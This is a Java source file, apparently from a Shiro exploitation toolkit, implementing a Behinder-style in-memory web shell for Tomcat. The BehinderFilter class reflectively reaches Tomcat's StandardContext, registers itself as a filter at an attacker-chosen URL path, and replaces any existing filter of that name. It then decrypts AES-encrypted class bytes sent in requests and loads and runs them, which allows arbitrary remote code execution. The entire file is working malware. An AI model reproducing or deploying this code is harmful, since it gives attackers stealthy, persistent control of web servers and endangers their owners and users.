package com.y5neko.shiroexp.memshell;


import org.apache.catalina.LifecycleState;
import org.apache.catalina.connector.RequestFacade;
import org.apache.catalina.connector.ResponseFacade;
import org.apache.catalina.core.ApplicationContext;
import org.apache.catalina.core.StandardContext;
import org.apache.catalina.util.LifecycleBase;

import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
import javax.servlet.*;
import javax.servlet.FilterRegistration.Dynamic;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import javax.servlet.http.HttpSession;
import java.io.IOException;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.math.BigInteger;
import java.security.MessageDigest;
import java.util.EnumSet;
import java.util.HashMap;
import java.util.Map;

public final class BehinderFilter extends ClassLoader implements Filter {
    public HttpServletRequest request = null;
    public HttpServletResponse response = null;
    public String cs = "UTF-8";
    public String Pwd = "f98169dbc69102e0";
    public String path = "/img/20190231.png";

    public BehinderFilter() {
    }

    public BehinderFilter(ClassLoader c) {
        super(c);
    }

    public Class g(byte[] b) {
        return super.defineClass(b, 0, b.length);
    }

    public static String md5(String s) {
        String ret = null;

        try {
            MessageDigest m = MessageDigest.getInstance("MD5");
            m.update(s.getBytes(), 0, s.length());
            ret = (new BigInteger(1, m.digest())).toString(16).substring(0, 16);
        } catch (Exception var3) {
        }

        return ret;
    }

    public boolean equals(Object obj) {
        this.parseObj(obj);
        this.Pwd = md5(this.request.getHeader("p"));
        this.path = this.request.getHeader("path");
        StringBuffer output = new StringBuffer();
        String tag_s = "->|";
        String tag_e = "|<-";

        try {
            this.response.setContentType("text/html");
            this.request.setCharacterEncoding(this.cs);
            this.response.setCharacterEncoding(this.cs);
            output.append(this.addFilter());
        } catch (Exception var7) {
            output.append("ERROR:// " + var7.toString());
        }

        try {
            this.response.getWriter().print(tag_s + output.toString() + tag_e);
            this.response.getWriter().flush();
            this.response.getWriter().close();
        } catch (Exception var6) {
        }

        return true;
    }

    public void parseObj(Object obj) {
        if (obj.getClass().isArray()) {
            Object[] data = (Object[])((Object[])obj);
            this.request = (HttpServletRequest)data[0];
            this.response = (HttpServletResponse)data[1];
        } else {
            try {
                Class clazz = Class.forName("javax.servlet.jsp.PageContext");
                this.request = (HttpServletRequest)clazz.getDeclaredMethod("getRequest").invoke(obj);
                this.response = (HttpServletResponse)clazz.getDeclaredMethod("getResponse").invoke(obj);
            } catch (Exception var8) {
                if (obj instanceof HttpServletRequest) {
                    this.request = (HttpServletRequest)obj;

                    try {
                        Field req = this.request.getClass().getDeclaredField("request");
                        req.setAccessible(true);
                        HttpServletRequest request2 = (HttpServletRequest)req.get(this.request);
                        Field resp = request2.getClass().getDeclaredField("response");
                        resp.setAccessible(true);
                        this.response = (HttpServletResponse)resp.get(request2);
                    } catch (Exception var7) {
                        try {
                            this.response = (HttpServletResponse)this.request.getClass().getDeclaredMethod("getResponse").invoke(obj);
                        } catch (Exception var6) {
                        }
                    }
                }
            }
        }

    }

    public String addFilter() throws Exception {
        ServletContext servletContext = this.request.getServletContext();
        Filter filter = this;
        String filterName = this.path;
        String url = this.path;

        Field contextField = null;
        ApplicationContext applicationContext = null;
        StandardContext standardContext = null;
        Field stateField = null;
        Dynamic filterRegistration = null;

        String var11;
        try {
            contextField = servletContext.getClass().getDeclaredField("context");
            contextField.setAccessible(true);
            applicationContext = (ApplicationContext)contextField.get(servletContext);
            contextField = applicationContext.getClass().getDeclaredField("context");
            contextField.setAccessible(true);
            standardContext = (StandardContext)contextField.get(applicationContext);
            stateField = LifecycleBase.class.getDeclaredField("state");
            stateField.setAccessible(true);
            stateField.set(standardContext, LifecycleState.STARTING_PREP);

            String existsMsg = null;
            // 检查Filter是否已存在
            if (servletContext.getFilterRegistration(filterName) != null) {
                existsMsg = "Filter already exists, overwriting...";
                // 删除旧的FilterDef和FilterMap
                try {
                    // 删除FilterMap
                    Class filterMapClass;
                    try {
                        filterMapClass = Class.forName("org.apache.tomcat.util.descriptor.web.FilterMap");
                    } catch (Exception e) {
                        filterMapClass = Class.forName("org.apache.catalina.deploy.FilterMap");
                    }
                    Method findFilterMaps = standardContext.getClass().getMethod("findFilterMaps");
                    Object[] filterMaps = (Object[]) findFilterMaps.invoke(standardContext);

                    java.util.List<Object> filterMapsList = new java.util.ArrayList<>();
                    for (Object map : filterMaps) {
                        Method getFilterName = filterMapClass.getMethod("getFilterName");
                        String name = (String) getFilterName.invoke(map);
                        if (!name.equalsIgnoreCase(filterName)) {
                            filterMapsList.add(map);
                        }
                    }

                    // 重新设置filterMaps
                    Field filterMapsField = standardContext.getClass().getDeclaredField("filterMaps");
                    filterMapsField.setAccessible(true);
                    filterMapsField.set(standardContext, filterMapsList.toArray((Object[]) java.lang.reflect.Array.newInstance(filterMapClass, 0)));

                    // 删除FilterDef
                    Method findFilterDef = standardContext.getClass().getMethod("findFilterDef", String.class);
                    Object filterDef = findFilterDef.invoke(standardContext, filterName);
                    if (filterDef != null) {
                        Method removeFilterDef = standardContext.getClass().getMethod("removeFilterDef", filterDef.getClass());
                        removeFilterDef.invoke(standardContext, filterDef);
                    }
                } catch (Exception e) {
                    // 删除失败，忽略
                }
            }

            filterRegistration = servletContext.addFilter(filterName, filter);
            if (filterRegistration != null) {
                filterRegistration.addMappingForUrlPatterns(EnumSet.of(DispatcherType.REQUEST), false, new String[]{url});
            }

            Method filterStartMethod = StandardContext.class.getMethod("filterStart");
            filterStartMethod.setAccessible(true);
            filterStartMethod.invoke(standardContext, (Object[])null);
            stateField.set(standardContext, LifecycleState.STARTED);
            var11 = null;

            Class filterMapClass;
            try {
                filterMapClass = Class.forName("org.apache.tomcat.util.descriptor.web.FilterMap");
            } catch (Exception var21) {
                filterMapClass = Class.forName("org.apache.catalina.deploy.FilterMap");
            }

            Method findFilterMaps = standardContext.getClass().getMethod("findFilterMaps");
            Object[] filterMaps = (Object[])((Object[])findFilterMaps.invoke(standardContext));

            for(int i = 0; i < filterMaps.length; ++i) {
                Object filterMapObj = filterMaps[i];
                findFilterMaps = filterMapClass.getMethod("getFilterName");
                String name = (String)findFilterMaps.invoke(filterMapObj);
                if (name.equalsIgnoreCase(filterName)) {
                    filterMaps[i] = filterMaps[0];
                    filterMaps[0] = filterMapObj;
                }
            }

            String var25 = "Success";
            if (existsMsg != null) {
                return existsMsg + " " + var25;
            }
            return var25;
        } catch (Exception var22) {
            var11 = var22.getMessage();
        } finally {
            stateField.set(standardContext, LifecycleState.STARTED);
        }

        return var11;
    }

    public void doFilter(ServletRequest req, ServletResponse resp, FilterChain chain) throws IOException, ServletException {
        HttpSession session = ((HttpServletRequest)req).getSession();
        Object lastRequest = req;
        Object lastResponse = resp;
        // 解决包装类RequestWrapper的问题
        // 详细描述见 https://github.com/rebeyond/Behinder/issues/187
        if (!(lastRequest instanceof RequestFacade)) {
            Method getRequest = null;
            try {
                getRequest = ServletRequestWrapper.class.getMethod("getRequest");
                lastRequest = getRequest.invoke(request);
                while (true) {
                    if (lastRequest instanceof RequestFacade) break;
                    lastRequest = getRequest.invoke(lastRequest);
                }
            } catch (Exception e) {
//                e.printStackTrace();
            }
        }
        // 解决包装类ResponseWrapper的问题
        try {
            if (!(lastResponse instanceof ResponseFacade)) {
                Method getResponse = ServletResponseWrapper.class.getMethod("getResponse");
                lastResponse = getResponse.invoke(response);
                while (true) {
                    if (lastResponse instanceof ResponseFacade) break;
                    lastResponse = getResponse.invoke(lastResponse);
                }
            }
        }catch (Exception e) {

        }

        Map obj = new HashMap();
        obj.put("request", lastRequest);
        obj.put("response", lastResponse);
        obj.put("session", session);

        try {
            session.putValue("u", this.Pwd);
            Cipher c = Cipher.getInstance("AES");
            c.init(2, new SecretKeySpec(this.Pwd.getBytes(), "AES"));
            (new BehinderFilter(this.getClass().getClassLoader())).g(c.doFinal(this.base64Decode(req.getReader().readLine()))).newInstance().equals(obj);
        } catch (Exception var7) {
            var7.printStackTrace();
        }

    }

    public byte[] base64Decode(String str) throws Exception {
        try {
            Class clazz = Class.forName("sun.misc.BASE64Decoder");
            return (byte[])((byte[])clazz.getMethod("decodeBuffer", String.class).invoke(clazz.newInstance(), str));
        } catch (Exception var5) {
            Class clazz = Class.forName("java.util.Base64");
            Object decoder = clazz.getMethod("getDecoder").invoke((Object)null);
            return (byte[])((byte[])decoder.getClass().getMethod("decode", String.class).invoke(decoder, str));
        }
    }

    public void init(FilterConfig filterConfig) throws ServletException {
    }

    public void destroy() {
    }
}
